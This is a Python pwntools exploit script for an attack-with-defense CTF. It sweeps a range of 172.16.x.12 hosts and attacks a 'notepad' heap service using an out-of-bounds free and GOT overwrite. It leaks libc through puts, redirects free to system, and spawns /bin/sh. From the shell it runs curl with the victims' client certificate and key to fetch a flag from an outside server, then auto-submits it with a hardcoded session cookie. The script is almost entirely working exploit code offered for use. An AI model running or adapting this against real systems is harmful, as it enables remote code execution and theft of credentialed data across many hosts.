from pwn import *
import sys
from pwn import *
import sys
import json
from requests import post

cookie = "shiro.session=3e09c2e7-7b93-429b-b076-61eab210e509"
url = "http://192.168.126.20:8080/awd/attackAndDefChange"

def submit(flag):
	print post(url, headers={"Cookie": cookie}, data={"questAnswer" : flag, "matchId" : 1}).text


for i in range(10, 50):
	try:
		libc = ELF("./libc.so.6")
		elf = ELF("./notepad")
		ip = "172.16.%d.12" % i
		p = remote(ip, 10002, timeout=2)
		def add(size,content):
			p.sendlineafter(">> ","1")
			p.sendlineafter("Size: ",str(size))
			p.sendafter("Data: ",content)

		def edit(index,size,content):
			p.sendlineafter(">> ","2")
			p.sendlineafter("Index: ",str(index))
			p.sendlineafter("Size: ",str(size))
			p.sendafter("Data: ",content)

		def show(index):
			p.sendlineafter(">> ","3")
			p.sendlineafter("Index: ",str(index))

		def free(index):
			p.sendlineafter(">> ","4")
			p.sendlineafter("Index: ",str(index))

		def set_key(key):
			p.sendlineafter(">> ","5")
			p.sendlineafter(">> ","1")
			p.sendafter("Key: ",key)

		def encrypt(index):
			p.sendlineafter(">> ","5")
			p.sendlineafter(">> ","2")
			p.sendlineafter("Index: ",str(index))
			
		def decrypt(index):
			p.sendlineafter(">> ","5")
			p.sendlineafter(">> ","3")
			p.sendlineafter("Index: ",str(index))
			
		def debugf():
			gdb.attach(p,"b *0x0000000000402077\nb free\nb *0x402471")
		f = []
	
		#context.log_level = "debug"
		#context.terminal = ["tmux","splitw","-v"]
		size = 0x61
		for i in range(20):
			add(size,(chr(ord("a")+i))*size)
		set_key("\x50\x60".ljust(7,"\x00")+"\x01")
		target = 0x6040E0
		ori = 0x604E80
		index = -151 + 5
		#print index
		free(index)
		add(size-0x10,"a"*(size-0x10))
		payload = p64(elf.got["puts"]) + p64(1) + p64(0x51)
		edit(20,len(payload),payload)
		show(16)
		puts_addr = u64(p.recv(6).ljust(8,"\x00"))
		libc.address = puts_addr - libc.symbols["puts"]
		log.success("libc_base:"+hex(libc.address))
		payload = p64(elf.got["free"]) + p64(1) + p64(0x51)
		edit(20,len(payload),payload)
		payload = p64(libc.symbols["system"])
		edit(16,len(payload),payload)
		edit(0,8,"/bin/sh\x00")
		free(0)
		p.sendline("curl --cert /home/pwn3/pwn/client.crt --cacert /home/pwn3/pwn/ca.crt --key /home/pwn3/pwn/client.key  https://FlagServer.com:9000/flag")
		flag = p.recvline()
		j = json.loads(flag)
		submit(j["flag"])
		flag = j["flag"] + "\n" 
		print flag
		f.append(flag)
		p.close()
	except:
		continue
	print(f)
